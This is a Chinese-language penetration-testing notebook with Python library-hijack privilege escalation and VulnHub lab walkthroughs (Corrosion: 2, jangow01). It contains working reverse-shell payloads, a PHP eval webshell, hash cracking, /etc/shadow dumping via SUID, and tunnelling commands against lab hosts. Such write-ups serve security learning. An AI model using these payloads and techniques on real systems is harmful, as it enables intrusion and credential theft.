# 渗透测试



## 权限提升



### msf 一键提权



### sudo



### Python 库劫持

#### PYTHONPATH

Python 在导入模块时，会按 `sys.path` 列表中的顺序搜索路径。攻击者可将恶意库放置在高优先级的路径中（如当前工作目录），覆盖合法库。

通过设置 `PYTHONPATH` 环境变量，添加攻击者控制的目录到模块搜索路径的最前端。



查看用户的 sudo 权限，允许设置环境变量，允许通过 sudo 以 root 用户允许某个 Python 脚本。

```
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) SETENV: PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```



Python 脚本的内容如下，脚本中使用 base64，可以通过 PYTHONPATH 环境变量进行劫持。

```
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
```



创建 /tmp/lib 目录，创建 base64.py 文件

```
-rwxrwxr-x 1 randy randy   33 Mar  3 03:39 base64.py
```



base64.py 文件的内容为启动一个 bash

```
import os
os.system('/bin/bash')
```



劫持成功

```
randy@corrosion:/tmp/lib$ sudo PYTHONPATH=/tmp/lib/ /usr/bin/python3.8 /home/randy/randombase64.py 
root@corrosion:/tmp/lib# id
uid=0(root) gid=0(root) groups=0(root)
```





#### 库文件修改

Python 脚本使用某个库文件（如：base64.py），允许以 root 用户脚本，用户可以**修改库文件内容**。



sudo 允许以 root 用户运行脚本

```
sudo -l

Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```



Python 脚本如下：

```
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
```



查看 Python 搜索库的路径

```
>>> import sys
>>> print("\n".join(sys.path))

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```



在系统上查找所有 base64.py 文件

```
locate base64.py

/home/randy/randombase64.py
/snap/core18/2128/usr/lib/python3.6/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python2.7/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python3.6/base64.py
/usr/lib/python3.8/base64.py
```



查看文件的权限（具有写入权限）

```
-rwxrwxrwx 1 root root 20420 Mar  2 16:52 /usr/lib/python3.8/base64.py
```



修改 base64.py 文件

![image-20250303085207798](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250303085207798.png)



sudo 执行脚本，获得 root 权限。

```
sudo /usr/bin/python3.8 /home/randy/randombase64.py 

[sudo] password for randy: 
root@corrosion:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```



### 动态链接库劫持





## vulnhub

### Corrosion: 2

Nmap 扫描 IP 地址。

```
msf6 > db_nmap -sP -PR -T 5 -n 10.10.10.0/24
[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 07:30 UTC
[*] Nmap: Nmap scan report for 10.10.10.1
[*] Nmap: Host is up (0.00047s latency).
[*] Nmap: MAC Address: 00:50:56:C0:00:0A (VMware)
[*] Nmap: Nmap scan report for 10.10.10.103
[*] Nmap: Host is up (0.00016s latency).
[*] Nmap: MAC Address: 00:0C:29:25:CD:30 (VMware)
[*] Nmap: Nmap scan report for 10.10.10.200
[*] Nmap: Host is up (0.000082s latency).
[*] Nmap: MAC Address: 00:50:56:FA:67:12 (VMware)
[*] Nmap: Nmap scan report for 10.10.10.10
[*] Nmap: Host is up.
[*] Nmap: Nmap done: 256 IP addresses (4 hosts up) scanned in 1.53 seconds
```

```
address       mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----  -------  ---------  -----  -------  ----  --------
10.10.10.1    00:50:56:C0:00:0A
10.10.10.10
10.10.10.103  00:0C:29:25:CD:30
10.10.10.200  00:50:56:FA:67:12
```

注：此处通过排除法确定 10.10.10.103 是靶机（因为其他机器全是我的）。



Nmap 扫描 IP 的 TCP 端口信息和操作系统信息。

```
msf6 > db_nmap -sS -sV -p- -r -n -T 5 -O 10.10.10.103
[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 07:35 UTC
[*] Nmap: Nmap scan report for 10.10.10.103
[*] Nmap: Host is up (0.00040s latency).
[*] Nmap: Not shown: 65532 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: 80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
[*] Nmap: 8080/tcp open  http    Apache Tomcat 9.0.53
[*] Nmap: MAC Address: 00:0C:29:25:CD:30 (VMware)
[*] Nmap: Device type: general purpose|router
[*] Nmap: Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
[*] Nmap: OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 9.28 seconds
```

```
host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.103  22    tcp    ssh   open   OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0
10.10.10.103  80    tcp    http  open   Apache httpd 2.4.41 (Ubuntu)
10.10.10.103  8080  tcp    http  open   Apache Tomcat 9.0.53
```

注：存在两个网站，通过浏览器访问，未发现有用的信息。



尝试使用 FFUF 扫描 80 端口的网页

```
ffuf -u http://10.10.10.103/indexFUZZ -w web-extensions-big.txt

.html                   [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 5ms]
.html                   [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 2ms]
:: Progress: [66886/66886] :: Job [1/1] :: 18181 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

```
ffuf -u http://10.10.10.103/FUZZ -w raft-medium-files-lowercase.txt

index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 2ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.                       [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 1ms]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htm                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htpasswds              [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htgroup                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htaccess.bak           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htuser                 [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.ht                     [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htc                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
:: Progress: [16244/16244] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

注：没有发现任何有用的信息。以 . 开头的 .xxx 403 信息是误报。



尝试使用 FFUF 扫描 8080 端口的网页

```
ffuf -u http://10.10.10.103:8080/indexFUZZ -w web-extensions-big.txt
.jsp                    [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 37ms]
.jsp                    [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 14ms]
:: Progress: [66886/66886] :: Job [1/1] :: 13333 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

```
ffuf -u http://10.10.10.103:8080/FUZZ -w raft-large-files-lowercase.txt

favicon.ico             [Status: 200, Size: 21630, Words: 19, Lines: 22, Duration: 22ms]
.                       [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 6ms]
index.jsp               [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 3ms]
readme.txt              [Status: 200, Size: 153, Words: 28, Lines: 3, Duration: 7ms]
backup.zip              [Status: 200, Size: 33723, Words: 146, Lines: 121, Duration: 7ms]
:: Progress: [35325/35325] :: Job [1/1] :: 12500 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

发现 backup.zip 文件，可能是管理员在备份时忽视大意忘记删除了，通过 HTTP 服务暴露出来了。



使用 words 字典配合 .jsp,.zip,.txt 进行扫描。

```
ffuf -u http://10.10.10.103:8080/FUZZ -w raft-medium-words-lowercase.txt -e .jsp,.zip,.txt

index.jsp               [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 5ms]
docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
backup.zip              [Status: 200, Size: 33723, Words: 146, Lines: 121, Duration: 4ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
.                       [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 3ms]
readme.txt              [Status: 200, Size: 153, Words: 28, Lines: 3, Duration: 1ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
:: Progress: [225172/225172] :: Job [1/1] :: 1818 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```



端口扫描时发现 8080 是 tomcat 服务器，manager 是 tomcat 服务器的 web 管理页面。

访问页面需要提供账号密码。

![image-20250302162514632](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302162514632.png)



下载压缩包，看看其中是否存在可用信息。

```
root@xiaoshae:/opt# wget http://10.10.10.103:8080/backup.zip
--2025-03-02 18:30:07--  http://10.10.10.103:8080/backup.zip
Connecting to 10.10.10.103:8080... connected.
HTTP request sent, awaiting response... 200 
Length: 33723 (33K) [application/zip]
Saving to: ‘backup.zip’

backup.zip                               100%[===============================================================================>]  32.93K  --.-KB/s    in 0s      

2025-03-02 18:30:07 (892 MB/s) - ‘backup.zip’ saved [33723/33723]
```



尝试解压，发现需要账号密码

```
unzip backup.zip 
Archive:  backup.zip
[backup.zip] catalina.policy password: root
```



使用 zip2john 提取 hash 

```
zip2john backup.zip > hash 

ver 2.0 efh 5455 efh 7875 backup.zip/catalina.policy PKZIP Encr: TS_chk, cmplen=2911, decmplen=13052, crc=AD0C6FDB ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/context.xml PKZIP Encr: TS_chk, cmplen=721, decmplen=1400, crc=59B9F4E7 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/catalina.properties PKZIP Encr: TS_chk, cmplen=2210, decmplen=7276, crc=1CD3C095 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/jaspic-providers.xml PKZIP Encr: TS_chk, cmplen=626, decmplen=1149, crc=748A87A6 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/jaspic-providers.xsd PKZIP Encr: TS_chk, cmplen=862, decmplen=2313, crc=3B44D150 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/logging.properties PKZIP Encr: TS_chk, cmplen=1076, decmplen=4144, crc=1D6C26F7 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/server.xml PKZIP Encr: TS_chk, cmplen=2609, decmplen=7589, crc=F91AC0C0 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/tomcat-users.xml PKZIP Encr: TS_chk, cmplen=1167, decmplen=2972, crc=BDCB08B9 ts=B0E3 cs=b0e3 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/tomcat-users.xsd PKZIP Encr: TS_chk, cmplen=858, decmplen=2558, crc=E8F588C2 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/web.xml PKZIP Encr: TS_chk, cmplen=18917, decmplen=172359, crc=B8AF6070 ts=6920 cs=6920 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```



尝试爆破密码

```
john --wordlist=rockyou.txt hash 

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
@administrator_hi5 (backup.zip)     
1g 0:00:00:01 DONE (2025-03-02 18:32) 0.9901g/s 11387Kp/s 11387Kc/s 11387KC/s @lexus1s..9Spruce
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

密码为：@administrator_hi5



解压压缩包

```
unzip backup.zip

Archive:  backup.zip
[backup.zip] catalina.policy password: 
  inflating: catalina.policy         
  inflating: context.xml             
  inflating: catalina.properties     
  inflating: jaspic-providers.xml    
  inflating: jaspic-providers.xsd    
  inflating: logging.properties      
  inflating: server.xml              
  inflating: tomcat-users.xml        
  inflating: tomcat-users.xsd        
  inflating: web.xml
```



查找文件信息，在 tomcat-users.xml 文件中发现 tomcat manager 的密码为 **melehifokivai**。

![image-20250302183425398](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302183425398.png)



成功登录 manager 页面，发现可以部署 war 应用程序

![image-20250302183621629](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302183621629.png)



使用 msfvenom 生成适用于 war 的反向 shell

```
msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=8080 -f war -o shell.war

Payload size: 6210 bytes
Final size of war file: 6210 bytes
Saved as: shell.war
```



使用 msfconsole 监听

```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set PAYLOAD java/meterpreter/reverse_tcp 
PAYLOAD => java/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 10.10.10.10
LHOST => 10.10.10.10

msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.10.10:8080 
```



在 manager 中部署 shell.war 应用程序

![image-20250302184036642](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302184036642.png)



部署成功后访问页面（页面为空是正常情况）

![image-20250302184059909](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302184059909.png)

![image-20250302184118563](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302184118563.png)



反向 shell 连接成功

```
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.10.10:8080 
[*] Sending stage (58073 bytes) to 10.10.10.103
[*] Meterpreter session 1 opened (10.10.10.10:8080 -> 10.10.10.103:58936) at 2025-03-02 10:41:02 +0000

meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > 
```



提升会话

```
msf6 exploit(multi/handler) > sessions -u 1 
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_railgun_api, stdapi_sys_process_kill
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.10.10:4433 
[*] Command stager progress: 100.00% (773/773 bytes)

[*] Sending stage (1017704 bytes) to 10.10.10.103
msf6 exploit(multi/handler) > [*] Meterpreter session 2 opened (10.10.10.10:4433 -> 10.10.10.103:34140) at 2025-03-02 10:42:20 +0000
[*] Stopping exploit/multi/handler

msf6 exploit(multi/handler) > 
```



通过 Meterpreter 收集信息

```
msf6 exploit(multi/handler) > sessions -i 2 
[*] Starting interaction with 2...

meterpreter > sysinfo 
Computer     : 10.10.10.103
OS           : Ubuntu 20.04 (Linux 5.11.0-34-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > 
```



在 /home 路径下存在两个用户

```
tomcat@corrosion:/home$ ls
jaye
randy
```



尝试撞库攻击，使用 manager 的密码（**melehifokivai**），去 ssh 登录这两个用户，发现 jaye 用户密码和 manager 密码一致。

登录 jaye 账户后发现其存在一个 **SUID 和 SGID** 的可执行文件。

- 当用户执行该文件时，进程的 **有效用户 ID** 会临时变为文件所有者（`root`）。
- 进程的 **有效组 ID** 会临时变为文件所属组（`root`）。

```
jaye@corrosion:~/Files$ file look
look: setuid, setgid executable, regular file, no read permission
```



`look` 是一个命令行工具，通常用于在 **已排序的文件** 中查找以特定字符串开头的行。它的行为类似于简化的 `grep`，但专为快速查找前缀设计。

- `[-bdf]`：可选参数（选项）：
    - `-b`：在查找时忽略字符串前的空白（如空格、制表符）。
    - `-d`：仅比较字母、数字和空格（忽略其他字符，如标点符号）。
    - `-f`：忽略大小写（如将 "A" 和 "a" 视为相同）。
- `[-t char]`：指定终止符（`char` 是一个字符），仅匹配到该字符前的字符串。
- `string`：要查找的 **前缀字符串**（必需参数）。
- `[file ...]`：要搜索的文件列表（可选参数，默认可能使用系统字典文件）。



当普通用户 jaye 执行 look 命令是，look 命令会以 root 权限运行，使用 look 读取 /etc/shadow 文件

```
jaye@corrosion:~/Files$ ./look '' /etc/shadow 
root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::
...
randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
...
tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPfrBNC1:18888:0:99999:7:::
...
jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::
```



使用 john 成功爆破 randy 密码

```
john — wordlist=/usr/share/wordlists/rockyou.txt hash.txt
...
07051986randy
```



切换到 randy 用户

```
jaye@corrosion:/home/randy$ su randy 
Password: 
randy@corrosion:~$ 
```



查看 randy 的 sudo 权限，输出显示 Randy 可以使用提升的权限运行 Python 脚本。

```
randy@corrosion:~$ sudo -l 
[sudo] password for randy: 
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```



randombase64.py 仅 root 用户可以修改，查看这个 python 脚本发现其导入一个 base64 库文件。

```
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
randy@corrosion:~$ file randombase64.py 
randombase64.py: ASCII text
```



基础的 Python 库劫持有 **PYTHONPATH环境变量、直接修改库文件（具有写权限）**。

因为 sudo 命令的安全设置，**会重置环境变量**，且无法设置环境变量，所以不存在**PYTHONPATH环境变量**。

```
randy@corrosion:/tmp/test$ sudo PYTHONPATH=/tmp/test/ /usr/bin/python3.8 /home/randy/randombase64.py 

sudo: sorry, you are not allowed to set the following environment variables: PYTHONPATH
```



查看 Python 搜索库的路径

```
>>> import sys
>>> print("\n".join(sys.path))

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```



在系统上查找所有 base64.py 文件

```
locate base64.py

/home/randy/randombase64.py
/snap/core18/2128/usr/lib/python3.6/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python2.7/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python3.6/base64.py
/usr/lib/python3.8/base64.py
```



查看文件的权限（具有写入权限）

```
-rwxrwxrwx 1 root root 20420 Mar  2 16:52 /usr/lib/python3.8/base64.py
```



修改 base64.py 文件

![image-20250303085207798](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250303085207798.png)



sudo 执行脚本，获得 root 权限。

```
sudo /usr/bin/python3.8 /home/randy/randombase64.py 

[sudo] password for randy: 
root@corrosion:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```



### jangow01



Nmap 扫描 IP 地址

```
nmap -sP -PR -n -T 5 10.10.10.0/24

...
MAC Address: 00:50:56:C0:00:0A (VMware)
Nmap scan report for 10.10.10.100
```



Nmap 扫描 TCP 端口，发现一个 HTTP 站点和 VSFTPD 站点。

```
db_nmap -sV -n -p- -r -T 5 -O 10.10.10.100

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.100  21    tcp    ftp   open   vsftpd 3.0.3
10.10.10.100  80    tcp    http  open   Apache httpd 2.4.18
```



使用 ffuf 高频文件字典爆破网站路径，发现 .backup 文件。

```
ffuf -u http://10.10.10.100/FUZZ -w raft-large-files-lowercase.txt

...
.backup                 [Status: 200, Size: 336, Words: 30, Lines: 13, Duration: 10ms]
...
:: Progress: [35325/35325] :: Job [1/1] :: 74 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```



使用 wget 下载 .backup 文件，发现里面为连接数据库的账号和密码。

```
wget http://10.10.10.100/.backup -O backup

# 文件内容
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
```



尝试使用改账号密码登录 ftp 服务器，登录成功，可能是系统用户。

![image-20250304140204604](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140204604.png)



使用浏览器访问网站，发现一个参数可以执行命令，以下是发现过程：

![image-20250304140413616](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140413616.png)

![image-20250304140500353](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140500353.png)

![image-20250304140522856](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140522856.png)

![image-20250304140534450](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140534450.png)



对一句话木马进行 base64 编码

```
<?php eval($_POST['CMD']); ?>
```

```
PD9waHAgZXZhbCgkX1BPU1RbJ0NNRCddKTsgPz4=
```



使用 yakit 上传一句话木马

![image-20250304140840730](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140840730.png)



使用中国蚁剑连接成功

![image-20250304141035051](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304141035051.png)



简单测试发现靶机对入站和出站流量做了限制

![image-20250304141208731](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304141208731.png)



使用 netstat -tunpl 发现靶机中开启了 ssh 服务，监听了 22 端口，但是配置了防火墙禁止 22 端口入站。

![image-20250304163418690](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304163418690.png)



使用 Neo-reGeorg 生成 php 文件，上传到网站中。

```
neoreg generate -k 123

    [+] Create neoreg server files:
       => neoreg_servers/tunnel.cs
       => neoreg_servers/tunnel.go
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.php
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel.jspx
```

![image-20250304162410860](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304162410860.png)



使用 Neo-reGeorg 将本地 2222 端口转发到远程主机 22 端口。

```
neoreg -k 123 -u http://10.10.10.100/site/tunnel.php --php --read-interval 1 --write-interval 1 -l 0.0.0.0 -p 2222 -t 127.0.0.1:22

+------------------------------------------------------------------------+
  Log Level set to [ERROR]
  Starting Forward [0.0.0.0:2222] => [127.0.0.1:22]
  Tunnel at:
    http://10.10.10.100/site/tunnel.php
+------------------------------------------------------------------------+
```



使用泄露的账号密码，通过 127.0.0.1:2222 进行 ssh 登录。

```
ssh jangow01@127.0.0.1 -p 2222

jangow01@127.0.0.1's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
...
jangow01@jangow01:~$ 
```



如果想要 msfconsole 接管系统，必须在远程端口转发，将靶机的流量转发到攻击机。

Neo-reGeorg 可以很好的进行本地端口转发，但不太适合进行远程端口转发，不过当前已经可以连接到靶机的 ssh 服务，可以使用 ssh 自带的远程端口转发。

```
ssh jangow01@127.0.0.1 -p 2222 -R 4444:127.0.0.1:4444 -R 5555:127.0.0.1:5555 -Nf
```



在靶机上执行 netstat -tunpl 命令，发现已经监听 4444 和 5555 端口。

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name	
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN       -               
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN       -               
```



在本机 nc -l -p 4444 监听端口，靶机连接 nc 127.0.0.1 4444 端口，数据转发成功。

```
jangow01@jangow01:~$ nc 127.0.0.1 4444
hello

root@localhost:~# nc -l -p 4444
hello
```



msfconsole 生成 payload 文件（LHOST 127.0.0.1 LPORT 4444），上传到靶机。

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o elf 

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: elf
```

![image-20250304181254293](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304181254293.png)



msfconsole 监听端口

```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp 
PAYLOAD => linux/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 127.0.0.1 
LHOST => 127.0.0.1

msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444

msf6 exploit(multi/handler) > run
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
```



在靶机上设置 elf 可执行权限，并执行。

![image-20250304181740428](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304181740428.png)



msfconsole 成功上线

```
[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Sending stage (3045380 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:40612) at 2025-03-04 10:16:55 +0000

meterpreter > sysinfo 
Computer     : 10.10.10.100
OS           : Ubuntu 16.04 (Linux 4.4.0-31-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > 
```



使用 post/multi/recon/local_exploit_suggester 扫描本地提权漏洞

```
meterpreter > run post/multi/recon/local_exploit_suggester
[*] 127.0.0.1 - Collecting local exploits for x64/linux...
[*] 127.0.0.1 - 203 exploit checks are being tried...
[+] 127.0.0.1 - exploit/linux/local/bpf_sign_extension_priv_esc: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/cve_2021_3493_overlayfs: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.
[+] 127.0.0.1 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/docker_cgroup_escape: The target is vulnerable. IF host OS is Ubuntu, kernel version 4.4.0-31-generic is vulnerable
[+] 127.0.0.1 - exploit/linux/local/glibc_realpath_priv_esc: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/ntfs3g_priv_esc: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/pkexec: The service is running, but could not be validated.
[+] 127.0.0.1 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/su_login: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/sudoedit_bypass_priv_esc: The target appears to be vulnerable. Sudo 1.8.16.pre.0ubuntu1.1 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
[*] Running check method for exploit 73 / 73
[*] 127.0.0.1 - Valid modules for session 1:
============================

 #   Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/bpf_sign_extension_priv_esc                     Yes                      The target appears to be vulnerable.
